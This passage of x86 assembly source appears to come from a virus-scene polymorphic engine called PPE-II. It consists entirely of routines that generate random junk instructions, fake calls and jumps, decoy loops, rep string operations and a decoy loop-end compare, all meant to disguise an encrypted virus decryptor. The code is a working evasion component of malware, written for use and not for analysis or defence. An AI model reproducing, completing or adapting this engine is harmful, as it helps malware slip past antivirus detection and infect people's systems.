		movzx	eax,byte ptr [ebp+__ppe_st_items]
		call	ppe_get_rnd_range
		push	eax
		imul	eax,00000008h
		cmp	dword ptr [esi+eax],00000000h
		pop	eax
		jnz	__ppes_cnext
		imul	eax,00000008h
		add	esi,eax
	__ppes_crun:
		lodsd				;already generated byte...
		lodsd
		add	eax,ebp
		call	eax
		mov	dword ptr [esi-8],1	;already generated flag
		dec	byte ptr [ebp+__ppe_st_flags]
		jz	__ppes_ccmp
		cmp	byte ptr [ebp+__ppe_st_flags+01h],00h
		jz	__ppes_cnext
		jmp	__ppes_crun
	__ppes_ccmp:
		mov	esi,[ebp+__ppe_st_o_table]
		movzx	eax,byte ptr [ebp+__ppe_st_items]
		imul	eax,00000008h
		add	esi,eax
		dec	ecx
		jnz	__ppes_choose

		; finishing (PPE-II)...
		mov	eax,edi
		sub	eax,[ebp+mem_address]
		mov	[ebp+poly_finish],eax
		popa
		ret

;ÄÄÄ´ polymorphic garbages PPE-II ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄ´ generate some garbages code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This main function generates garbages from my great table
		;Function can be recursived but it  cannot  generate copro
		;garbages yet. You can	set (garbage_style) if you want to
		;generate unmodify flags instructions.
		;
gen_garbage:

		inc	byte ptr [ebp+recursive_level]
		cmp	byte ptr [ebp+recursive_level],04h
		jae	__gg_exit

		; are registers full ?
		cmp	byte ptr [ebp+used_regs],0EFh
		jz	__gg_exit

		pusha
		mov	eax,00000004h
		call	ppe_get_rnd_range
		inc	eax
		mov	ecx,eax
	__gg_loop:
		push	ecx

		; have I use unmodify flags instructions ?
		cmp	byte ptr [ebp+garbage_style],USED_FLAGS
		jnz	__ggl_flags
		mov	eax,(end_no_flags - tbl_no_flags) / 02h
		call	ppe_get_rnd_range
		lea	esi,[ebp+tbl_no_flags+eax*02h]
		lodsb
		call	ppe_get_rnd_range
		add	al,[esi]
		call	__gg_test
		jc	__gg_finish
		lea	esi,[ebp+tbl_garbage+04h*eax]
		mov	eax,[esi]
		jmp	__gg_jump

	__ggl_flags:
		mov	eax,(end_garbage - tbl_garbage) / 04h
		call	ppe_get_rnd_range
		call	__gg_test
		jc	__gg_finish
		lea	esi,[ebp+tbl_garbage+eax*04h]
		lodsd
	__gg_jump:
		add	eax,ebp
		call	eax
	__gg_finish:
		pop	ecx
		loop	__gg_loop

		mov	[esp],edi
		popa

	__gg_exit:
		dec	byte ptr [ebp+recursive_level]
		ret

	__gg_test:
		clc
		push	eax
		test	byte ptr [ebp+garbage_style],not USED_BASED
		jnz	__ggt_success
		cmp	eax,__garbage_based_num
		jb	__ggt_success
	__ggt_failed:
		stc
	__ggt_success:
		pop	eax
		ret

		; gnerate garbage which will not modify flags (mov,stack...)
gen_garbage_no_flags:
		push	ax
		mov	al,[ebp+garbage_style]
		mov	byte ptr [ebp+garbage_style],USED_FLAGS
		call	gen_garbage
		mov	byte ptr [ebp+garbage_style],al
		pop	ax
		ret

;ÄÄÄ´ generate mov reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_movreg32imm:	call	ppe_get_empty_reg	;mov empty_reg32,imm
		mov	al,0b8h
		or	al,byte ptr [ebx]
		stosb
		call	ppe_get_rnd32
		stosd
		ret

g_movreg16imm:	call	ppe_get_empty_reg	;mov empty_reg16,imm
		mov	ax,0B866h
		or	ah,byte ptr [ebx]
		stosw
		call	ppe_get_rnd32
		stosw
		ret

g_movreg8imm:	call	ppe_get_empty_reg	;mov empty_reg8,imm
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	a_movreg8imm
		call	ppe_get_rnd32
		mov	al,0B0h
		or	al,byte ptr [ebx]
		mov	edx,eax
		call	ppe_get_rnd32
		and	ax,0004h
		or	ax,dx
		stosw
a_movreg8imm:	ret

;ÄÄÄ´ generate mov reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_movregreg32:	call	ppe_get_reg		;mov empty_reg32,reg32
		push	ebx
		call	ppe_get_empty_reg
		pop	edx
		cmp	ebx,edx
		jz	g_movregreg32		;mov ecx,ecx ? etc. ?
c_movregreg32:	mov	ah,byte ptr [ebx]
		shl	ah,3
		or	ah,byte ptr [edx]
		or	ah,0C0h
		mov	al,8Bh
		stosw
		ret

g_movregreg16:	call	ppe_get_reg		;mov empty_reg16,reg16
		push	ebx
		call	ppe_get_empty_reg
		pop	edx
		cmp	ebx,edx
		jz	g_movregreg16		;mov si,si ? etc. ?
		mov	al,66h
		stosb
		jmp	c_movregreg32

g_movregreg8:	call	ppe_get_reg		;mov empty_reg8,reg8
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	g_movregreg8
		push	ebx
		call	ppe_get_empty_reg
		pop	edx
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	a_movregreg8
		cmp	ebx,edx
		jz	g_movregreg8		;mov al,al ? etc. ?
		mov	ah,byte ptr [ebx]
		shl	ah,3
		or	ah,byte ptr [edx]
		or	ah,0C0h
		mov	al,8Ah
		push	eax
		call	ppe_get_rnd32
		pop	edx
		and	ax,2400h
		or	ax,dx
		stosw
a_movregreg8:	ret

;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_mathreg32imm: mov	al,81h			;math reg32,imm
		stosb
		call	ppe_get_empty_reg
		call	__do_math_work
		stosd
		ret

g_mathreg16imm: mov	ax,8166h		;math reg16,imm
		stosw
		call	ppe_get_empty_reg
		call	__do_math_work
		stosw
		ret

g_mathreg8imm:	call	ppe_get_empty_reg	;math reg8,imm
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	a_mathreg8imm
		mov	al,80h
		stosb
		call	__do_math_work
		stosb
		and	ah,04h
		or	byte ptr [edi-2],ah
a_mathreg8imm:	ret

	__do_math_work: 			;select math operation
		mov	eax,end_math_imm - tbl_math_imm
		call	ppe_get_rnd_range
		lea	esi,dword ptr [ebp+tbl_math_imm+eax]
		lodsb
		or	al,byte ptr [ebx]
		stosb
		call	ppe_get_rnd32
		ret

;ÄÄÄ´ generate push reg + garbage + pop reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_push_g_pop:	call	ppe_get_reg		;	push rnd_reg
		mov	al,50h			;	--garbage--
		or	al,byte ptr [ebx]	;	--garbage--
		stosb				;	pop empty_reg
		call	gen_garbage
		call	ppe_get_empty_reg
		mov	al,58h
		or	al,byte ptr [ebx]
		stosb
		ret

;ÄÄÄ´ generate call without return ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_call_cont:	mov	al,0E8h 		;	call	__here
		stosb				;	--rnd data--
		push	edi			;	--rnd data--
		stosd				;__here:
		call	ppe_gen_rnd_block	;	pop empty_reg
		pop	edx
		mov	eax,edi
		sub	eax,edx
		sub	eax,00000004h
		mov	[edx],eax
		call	gen_garbage_no_flags
		call	ppe_get_empty_reg
		mov	al,58h
		or	al,byte ptr [ebx]
		stosb
		ret

;ÄÄÄ´ generate unconditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_jump_u:	mov	al,0E9h 		;	jmp	__here
		stosb				;	--rnd data--
		push	edi			;	--rnd data--
		stosd				;__here:
		call	ppe_gen_rnd_block	;	--next code--
		pop	edx
		mov	eax,edi
		sub	eax,edx
		sub	eax,00000004h
		mov	dword ptr [edx],eax
		ret

;ÄÄÄ´ generate conditional jump ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_jump_c:	call	ppe_get_rnd32		;	jX __here
		and	ah,0Fh			;	--garbage--
		add	ah,80h			;	--garbage--
		mov	al,0Fh			;__here:
		stosw				;	--next code--
		push	edi
		stosd
		call	gen_garbage_no_flags
		pop	edx
		mov	eax,edi
		sub	eax,edx
		sub	eax,00000004h
		mov	dword ptr [edx],eax
		ret

;ÄÄÄ´ generate movzx,movsx reg32/16,reg16/8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_movzx_movsx_32:				;movzx/movsx reg32,reg16
		call	ppe_get_rnd32
		mov	ah,0B7h
		and	al,1
		jz	__d_movzx32
		mov	ah,0BFh
	__d_movzx32:
		mov	al,0Fh
		stosw
		call	ppe_get_reg
		push	ebx
		call	ppe_get_empty_reg
		pop	edx
		mov	al,byte ptr [ebx]
		shl	al,3
		or	al,0C0h
		or	al,byte ptr [edx]
		stosb
		ret

g_movzx_movsx_16:				;movzx/movsx reg16,reg8
		mov	al,66h
		stosb

g_movzx_movsx_8:				;movzx/movsx reg32,reg8
		call	ppe_get_rnd32
		mov	ah,0B6h
		and	al,1
		jz	__d_movzx32
		mov	ah,0BEh
		jmp	__d_movzx32

;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,imm ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_rotate_shift32:				;(r/s) reg32,imm8
		mov	al,0C1h
		stosb
		call	ppe_get_empty_reg
		call	__do_rs_work
		stosb
		ret

g_rotate_shift16:				;(r/s) reg16,imm8
		mov	al,66h
		stosb
		jmp	g_rotate_shift32

g_rotate_shift8:
		call	ppe_get_empty_reg	;(r/s) reg8,imm8
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	a_rotate_shift8
		mov	al,0C0h
		stosb
		call	__do_rs_work
		stosb
		and	ah,04h
		or	byte ptr [edi-2],ah
a_rotate_shift8:ret

	__do_rs_work:				;select r/s operation
		mov	eax,end_rs_imm - tbl_rs_imm
		call	ppe_get_rnd_range
		lea	esi,dword ptr [ebp+tbl_rs_imm+eax]
		lodsb
		or	al,byte ptr [ebx]
		stosb
		call	ppe_get_rnd32
		ret

;ÄÄÄ´ generate rol/ror/rcl/rcr/shl/shr/sar reg,reg8 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_rs_reg32reg8: 				;(r/s) reg32,reg8
		mov	al,0D3h
		stosb				;in fact, reg8 is always CL
		call	ppe_get_empty_reg	;because CPU allows only
		call	__do_rs_work		;this reg8
		ret

g_rs_reg16reg8: 				;(r/s) reg16,reg8 (CL)
		mov	al,66h
		stosb
		jmp	g_rs_reg32reg8

g_rs_reg8reg8:					;(r/s) reg8,reg8 (CL)
		call	ppe_get_empty_reg
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	a_rs_reg8reg8
		mov	ax,0D266h
		stosw
		call	__do_rs_work
		and	ah,04h
		or	byte ptr [edi-1],ah
a_rs_reg8reg8:	ret

;ÄÄÄ´ generate bt/bts/btr/btc reg32/16,(reg/imm)32/16 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_bt_regreg32:	mov	al,0Fh
		stosb
		call	__do_bt_work
		ret

g_bt_regreg16:	mov	ax,0F66h
		stosw
		call	__do_bt_work
		ret

	__do_bt_work:
		mov	eax,end_bt_reg - tbl_bt_reg
		call	ppe_get_rnd_range
		lea	esi,[ebp+tbl_bt_reg+eax]
		lodsb
		stosb
		call	ppe_get_empty_reg
		push	ebx
		call	ppe_get_reg
		pop	edx
		mov	al,byte ptr [ebx]
		shl	al,3
		or	al,0C0h
		or	al,byte ptr [edx]
		stosb
		ret

g_bit_test32:	mov	ax,0BA0Fh
		stosw
		call	__do_bit_test_work
		ret

g_bit_test16:	mov	al,66h
		stosb
		jmp	g_bit_test32

	__do_bit_test_work:
		mov	eax,end_bt_imm - tbl_bt_imm
		call	ppe_get_rnd_range
		lea	esi,[ebp+tbl_bt_imm+eax]
		call	ppe_get_empty_reg
		lodsb
		or	al,byte ptr [ebx]
		stosb
		call	ppe_get_rnd32
		stosb
		ret

;ÄÄÄ´ generate add/sub/xor/and/adc/sbb/or reg,reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_mathregreg32: 				;math reg32,reg32
		call	__do_math_regreg_work
		ret

g_mathregreg16: 				;math reg16,reg16
		mov	al,66h
		stosb
		jmp	g_mathregreg32

g_mathregreg8:					;math reg8,reg8
		call	ppe_get_reg
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	g_mathregreg8
		push	ebx
		call	ppe_get_empty_reg
		pop	edx
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	a_mathregreg8
		mov	eax,end_math_reg - tbl_math_reg
		call	ppe_get_rnd_range
		lea	esi,[ebp+tbl_math_reg+eax]
		lodsb
		dec	al
		stosb
		mov	al,byte ptr [ebx]
		shl	al,3
		or	al,byte ptr [edx]
		or	al,0C0h
		stosb
		call	ppe_get_rnd32
		and	al,24h
		or	byte ptr [edi-1],al
a_mathregreg8:	ret

	__do_math_regreg_work:
		mov	eax,end_math_reg - tbl_math_reg
		call	ppe_get_rnd_range
		lea	esi,[ebp+tbl_math_reg+eax]
		lodsb
		stosb
		call	ppe_get_reg
		push	ebx
		call	ppe_get_empty_reg
		pop	edx
		mov	al,byte ptr [ebx]
		shl	al,3
		or	al,0C0h
		or	al,byte ptr [edx]
		stosb
		ret

;ÄÄÄ´ set reg8 by flag ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_set_byte:	call	ppe_get_empty_reg
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	a_set_byte
		mov	al,0Fh
		stosb
		mov	eax,00000010h		;we have 16 opcodes, haha..
		call	ppe_get_rnd_range
		or	al,90h			;seta , setae, setb , setbe
		stosb				;sete , setg , setge, setl
		mov	al,byte ptr [ebx]	;setle, setne, setno, setnp
		or	al,0C0h 		;setns, seto , setp , sets
		stosb
		call	ppe_get_rnd32
		and	al,04h
		or	byte ptr [edi-1],al
a_set_byte:	ret

;ÄÄÄ´ generate garbage + loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_loop:

		; we can't be recursived because ECX is only for one LOOP
		cmp	byte ptr [ebp+recursive_level],01h
		jnz	a_loop

		; does ECX free ?
		test	byte ptr [ebp+used_regs],00000010b
		jnz	a_loop

		; generate ECX like counter
		mov	eax,00000030h		;future ECX to loop
		call	ppe_get_rnd_range
		add	eax,2
		mov	bl,00000001b		;write to ECX
		call	ppe_crypt_value

		; we don't want to change ECX
		or	byte ptr [ebp+used_regs],00000010b

		push	edi			;total garbages in bytes
		call	gen_garbage		;to calculate loop
		pop	eax
		sub	eax,edi
		sub	eax,2			;loop has two bytes

		mov	ah,0E2h 		;loop identification
		xchg	ah,al
		stosw

		; enable ECX
		and	byte ptr [ebp+used_regs],11111101b
a_loop: 	ret

;ÄÄÄ´ generate reg + garbage + dec reg + jnz reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÙ

		g_lj_reg	db	?	;0=8bit, 1=16bit, 2=32bit
		g_lj_reg_past	db	?	;0=low, 1=high (8BIT only)

g_loop_jump:

		; we can't be recursived because ECX is only for one LOOP_JUMP
		cmp	byte ptr [ebp+recursive_level],01h
		jnz	a_loop_jump

		; select a free register
		call	ppe_get_empty_reg
		mov	byte ptr [ebp+g_lj_reg],00h		;8 bit ...
		test	byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
		jnz	__g_lj_no_8bit
		mov	eax,00000001h				;hi, lo ?
		call	ppe_get_rnd_range
		mov	byte ptr [ebp+g_lj_reg_past],al
		jmp	__g_lj_okay

		; choose between reg16 and reg32
	__g_lj_no_8bit:
		mov	eax,00000002h		;reg16 or reg32 ?
		call	ppe_get_rnd_range
		inc	eax
		mov	byte ptr [ebp+g_lj_reg],al

	__g_lj_okay:
		push	ebx
		mov	eax,00000030h		;how many to looping ?
		call	ppe_get_rnd_range
		add	eax,2
		mov	bl,byte ptr [ebx]	;used reg
		call	ppe_crypt_value

		pop	ebx
		push	ebx
		mov	al,byte ptr [ebx]	;disable register
		call	__reg_to_bcd
		or	byte ptr [ebp+used_regs],ah

		push	edi
		call	gen_garbage
		pop	ecx

		mov	ax,4866h		;dec (reg16-clone)
		or	ah,byte ptr [ebx]
		cmp	byte ptr [ebp+g_lj_reg],00h
		jz	__g_lj_dec_8bit
		cmp	byte ptr [ebp+g_lj_reg],02h
		jz	__g_lj_dec_32bit
		stosb
	__g_lj_dec_32bit:
		xchg	ah,al
		stosb
		jmp	__g_lj_dec_finish
	__g_lj_dec_8bit:
		mov	ax,0C8FEh		;dec (reg8)
		or	ah,byte ptr [ebx]	;certain reg
		cmp	byte ptr[ebp+g_lj_reg_past],01h
		jz	__g_lj_dec_8bit_high
		stosw
		jmp	__g_lj_dec_finish
	__g_lj_dec_8bit_high:
		and	ah,24h
		stosw

	__g_lj_dec_finish:
		call	gen_garbage_no_flags
		pop	ebx

		mov	al,byte ptr [ebx]	;certain reg
		call	__reg_to_bcd
		not	ah
		and	byte ptr [ebp+used_regs],ah

		mov	ax,850Fh		;JNZ identification
		stosw

		mov	eax,ecx
		sub	eax,edi
		sub	eax,4
		stosd

a_loop_jump:	ret

;ÄÄÄ´ generate reg32 + call reg32 + rnd_block + pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function can generate CALL reg32 which will be gene-
		;rated by <ppe_crypt_value>.
		;
		g_cr32_reg	db	?
		g_cr32_full	db	?	;0=g_return,1=call,2=jump
		g_cr32_jump	dd	?	;address of CALL instruction
		;
g_call_reg32:

		mov	byte ptr [ebp+g_cr32_full],01h
b_call_reg32:	mov	dword ptr [ebp+g_cr32_jump],00000000h

		; test, if global index reg is generated
		cmp	byte ptr [ebp+gl_index_reg],-1
		jz	a_call_reg32

		; do not recursived - because it's few registers
		cmp	byte ptr [ebp+recursive_level],01h
		jnz	a_call_reg32

		; garbage only in main-poly loop
		cmp	dword ptr [ebp+__pllg_memory],00000000h
		jnz	a_call_reg32

		; save used-regs
		mov	al,[ebp+used_regs]
		push	ax

		; select an empty register
		call	ppe_get_empty_reg
		movzx	ebx,byte ptr [ebx]
		mov	byte ptr [ebp+g_cr32_reg],bl

		; calculate size of rnd_block
		mov	eax,00000030h
		call	ppe_get_rnd_range
		add	eax,00000005h		;damn, fucking BUG !!
		push	eax			;save it for later use
		jmp	d_call_reg32
c_call_reg32:	mov	byte ptr [ebp+g_cr32_full],00h
		mov	cl,[ebp+used_regs]
		push	cx
		mov	bl,byte ptr [ebx]
		mov	byte ptr [ebp+g_cr32_reg],bl
d_call_reg32:	call	ppe_crypt_value 	;ebx is full
		movzx	eax,byte ptr [ebp+g_cr32_reg]
		lea	ebx,[ebp+tbl_regs+02h*eax]
		call	__reg_to_bcd
		or	byte ptr [ebp+used_regs],ah
		call	gen_garbage_no_flags	;uaaahh
		call	__copro_fix_delta	; + global index register
		call	gen_garbage_no_flags

		; for <ppe_get_return> we don't want to set right size
		cmp	byte ptr [ebp+g_cr32_full],00h
		jz	e_call_reg32

		; set the right size
		mov	ebx,edi
		add	ebx,2+6 		; + call reg32 + (add/sub)
		sub	ebx,[ebp+poly_start]
		mov	eax,00000002h
		call	ppe_get_rnd_range
		or	al,al
		jz	__cr32_add
		neg	ebx
		mov	ax,0E881h		;sub reg32,imm32 id
		jmp	__cr32_finish
	__cr32_add:
		mov	ax,0C081h		;add reg32,imm32 id
	__cr32_finish:
		or	ah,byte ptr [ebp+g_cr32_reg]
		stosw
		mov	eax,ebx
		stosd
e_call_reg32:
		; now, write CALL reg32 instruction
		mov	ax,0D0FFh
		or	ah,byte ptr [ebp+g_cr32_reg]
		stosw
		mov	[ebp+g_cr32_jump],edi

		cmp	byte ptr [ebp+g_cr32_full],00h
		jz	f_call_reg32

		pop	ecx			;rnd_block length
		call	ppe_gen_rnd_fill	;ecx is full

		cmp	byte ptr [ebp+g_cr32_full],02h
		jz	f_call_reg32

		; and we must put value from stack via POP reg32
		call	gen_garbage_no_flags	;uaaahh...
		mov	al,58h
		or	al,byte ptr [ebp+g_cr32_reg]
		stosb
f_call_reg32:
		; restore used_regs
		pop	ax
		mov	[ebp+used_regs],al
a_call_reg32:	ret

;ÄÄÄ´ generate reg32 + jump reg32 + rnd_block ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_jump_reg32:

		mov	byte ptr [ebp+g_cr32_full],02h

		; write CALL reg32 garbage
		call	b_call_reg32
		cmp	dword ptr [ebp+g_cr32_jump],00000000h
		jz	a_jump_reg32

		; rewrite CALL reg32 --> JMP reg32
		mov	eax,[ebp+g_cr32_jump]
		add	byte ptr [eax-1],10h	;CALL reg32 -> JMP reg32

a_jump_reg32:	ret

;ÄÄÄ´ generate rep/repnz + cmps/lods/stos/scas/movs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÄÄÄÄÙ

		;---------------------------------------------------------
		;Welcome to my popular function. I think  any  comment	is
		;needless - because this  function is easy  to understand.
		;So, If u don't believe me, I'll show you some	functionz:
		;  * __gr_make_esi   ---   generate source
		;  * __gr_make_edi   ---   generate destination or source
		;  * __gr_make_ecx   ---   generate counter
		;
		;...easy to understand...
		;
g_repeat:

		; test, if global index register is generated
		cmp	byte ptr [ebp+gl_index_reg],-1
		jz	a_repeat

		; i must be far then about USED_MEMORY bytes
		call	__gr_where_in_mem
		jc	a_repeat

		; garbage use only in main-poly loop
		cmp	dword ptr [ebp+__pllg_memory],00000000h
		jnz	a_repeat

		; register ECX must be free
		test	byte ptr [ebp+used_regs],00000010b
		jnz	a_repeat

		; does ESI free ?
		test	byte ptr [ebp+used_regs],01000000b
		jnz	__gr_part_2

		; does EDI free ?
		test	byte ptr [ebp+used_regs],10000000b
		jnz	__gr_lods

		; all cmps/lods/stos/scas/movs, wow !
		mov	eax,(end_repeat - tbl_repeat) / 04h
		call	ppe_get_rnd_range
		lea	esi,[ebp+tbl_repeat+eax*04h]
		lodsd
		add	eax,ebp
		call	eax
		jmp	a_repeat

	__gr_part_2:
		; must be EDI free ..
		test	byte ptr [ebp+used_regs],10000000b
		jnz	a_repeat

		; only stos/scas ...
		mov	eax,00000002h
		call	ppe_get_rnd_range
		or	al,al
		jz	__gr_stos
		jmp	__gr_scas

	__gr_cmps:
		call	__gr_make_esi		;new esi to ebx
		call	__gr_make_edi		;new edi to ecx
		call	__gr_change

		push	ecx
		mov	eax,ebx
		mov	bl,00000110b		;esi register
		call	ppe_crypt_value
		lea	ebx,[ebp+tbl_regs+6*2]
		call	__copro_fix_delta
		or	byte ptr [ebp+used_regs],01000000b
		pop	eax
		mov	bl,00000111b		;edi register
		call	ppe_crypt_value
		lea	ebx,[ebp+tbl_regs+7*2]
		call	__copro_fix_delta
		or	byte ptr [ebp+used_regs],10000000b

		call	__gr_crypt_ecx		;ecx register
		call	__gr_make_rep		;rep or repnz ?
		mov	al,0A6h
		stosb
		and	byte ptr [ebp+used_regs],00111111b
		ret

	__gr_lods:
		; register EAX must be free
		test	byte ptr [ebp+used_regs],00000001h
		jnz	__gr_flods
		call	__gr_make_esi

		mov	eax,ebx
		mov	bl,00000110b
		call	ppe_crypt_value
		lea	ebx,[ebp+tbl_regs+6*2]
		call	__copro_fix_delta
		or	byte ptr [ebp+used_regs],01000000b

		call	__gr_crypt_ecx
		call	__gr_make_rep
		mov	al,0ACh
		stosb
		and	byte ptr [ebp+used_regs],10111111b
	__gr_flods:
		ret

	__gr_stos:
		call	__gr_make_edi

		mov	eax,ecx
		mov	bl,00000111b
		call	ppe_crypt_value
		lea	ebx,[ebp+tbl_regs+7*2]
		call	__copro_fix_delta
		or	byte ptr [ebp+used_regs],10000000b

		call	__gr_crypt_ecx
		call	__gr_make_rep
		mov	al,0AAh
		stosb
		and	byte ptr [ebp+used_regs],01111111b
		ret

	__gr_scas:
		call	__gr_make_edi
		or	byte ptr [ebp+used_regs],10000000b

		mov	eax,ecx
		mov	bl,00000111b
		call	ppe_crypt_value
		lea	ebx,[ebp+tbl_regs+7*2]
		call	__copro_fix_delta

		call	__gr_crypt_ecx
		call	__gr_make_rep
		mov	al,0AEh
		stosb
		and	byte ptr [ebp+used_regs],01111111b
		ret

	__gr_movs:
		call	__gr_make_esi
		call	__gr_make_edi
		call	__gr_change

		push	ecx
		mov	eax,ebx
		mov	bl,000000110b
		call	ppe_crypt_value
		lea	ebx,[ebp+tbl_regs+6*2]
		call	__copro_fix_delta
		or	byte ptr [ebp+used_regs],01000000b
		pop	eax
		mov	bl,000000111b
		call	ppe_crypt_value
		lea	ebx,[ebp+tbl_regs+7*2]
		call	__copro_fix_delta
		or	byte ptr [ebp+used_regs],10000000b

		call	__gr_crypt_ecx
		call	__gr_make_rep
		mov	al,0A4h
		stosb
		and	byte ptr [ebp+used_regs],00111111b
		ret

	__gr_make_rep:
		mov	bx,0F2F3h		;repnz, rep
		mov	eax,00000002h
		call	ppe_get_rnd_range
		xchg	eax,ebx
		or	bl,bl
		jz	__gr_make_repnz
		stosb
		ret
	__gr_make_repnz:
		xchg	ah,al
		stosb
		ret

	__gr_crypt_ecx:
		mov	eax,30
		call	ppe_get_rnd_range
		mov	bl,00000001b		;ecx register
		call	ppe_crypt_value
		ret

	__gr_make_esi:
		mov	eax,0000000Ah		;esi start
		call	ppe_get_rnd_range
		mov	ebx,eax
		sub	ebx,edi
		add	ebx,[ebp+poly_start]
		ret

	__gr_make_edi:
		mov	eax,000000Ah		;edi start
		call	ppe_get_rnd_range
		mov	ecx,eax
		sub	ecx,edi
		add	ecx,[ebp+poly_start]
		ret

	__gr_change:
		mov	eax,00000002h		;change esi and edi ?
		call	ppe_get_rnd_range
		or	al,al
		jz	__gr_change_no
		xchg	ebx,ecx
	__gr_change_no:
		ret

	__gr_where_in_mem:
		mov	eax,[ebp+poly_start]
		sub	eax,edi
		neg	eax
		cmp	eax,USED_MEMORY
a_repeat:	ret

;ÄÄÄ´ generate push value(32/16)/garbage/pop reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_pushpop_value:

		; value32 OR value16 ?
		call	ppe_get_rnd32		;save dword or word ?
		and	al,1
		jnz	__ppv_push16

		; short or long value ?
		call	ppe_get_rnd32
		and	al,1
		jnz	__ppv_push32_short

		; long value
		mov	al,68h			;save: PUSH 11223344h
		stosb				;code:	68  44332211
		call	ppe_get_rnd32
		stosd
		jmp	__ppv_finish32
	__ppv_push32_short:
		call	ppe_get_rnd32		;save: PUSH 00000009h
		mov	al,6Ah			;code:	6A     09
		stosw
		jmp	__ppv_finish32
	__ppv_push16:
		call	ppe_get_rnd32
		and	al,1
		jnz	__ppv_push16_short

		; long short-value
		mov	ax,6866h
		stosw
		call	ppe_get_rnd32
		stosw
		jmp	__ppv_finish16
	__ppv_push16_short:
		mov	ax,6A66h
		stosw
		call	ppe_get_rnd32
		stosb
		jmp	__ppv_finish16

		; time to POP value
	__ppv_finish32:
		call	gen_garbage		;POP reg32
		call	ppe_get_empty_reg
		mov	al,58h
		or	al,byte ptr [ebx]
		stosb
		jmp	__ppv_finish
	__ppv_finish16:
		call	gen_garbage		;POP reg16
		call	ppe_get_empty_reg
		mov	ax,5866h
		or	ah,byte ptr [ebx]
		stosw

	__ppv_finish:
		ret

;ÄÄÄ´ function to crypt a random value to reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

g_crypt_value:

		call	ppe_get_empty_reg
		mov	bl,al
		call	ppe_get_rnd32
		call	ppe_crypt_value
		ret

;ÄÄÄ´ function to simulate end of encode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function can generate "destination"  compare  like a
		;bafflement. So, this garbage generate this code:
		;
		;	CALL	    __pos_1		;any garbages
		;	<rnd_data>			;typical CALL rnd_data
		;  __i: JMP	    __compare_back	;  NEW JUMP
		;	<rnd_data>			;typical CALL rnd_data
		;  __pos_1:
		;	<next_code>			;loop,next_index...
		;	DEC	    reg32		;typical CMP instruction
		;	<garbages>
		;	CMP	    reg32,reg32 	;compare registers
		;	<garbages - no_flags>		;no_flags garbages
		;	JNZ	    __i 		;typical CMP c-jump
		;	<garbages>
		;  __compare_back:			;come back and continue
		;	<next_code>
		;
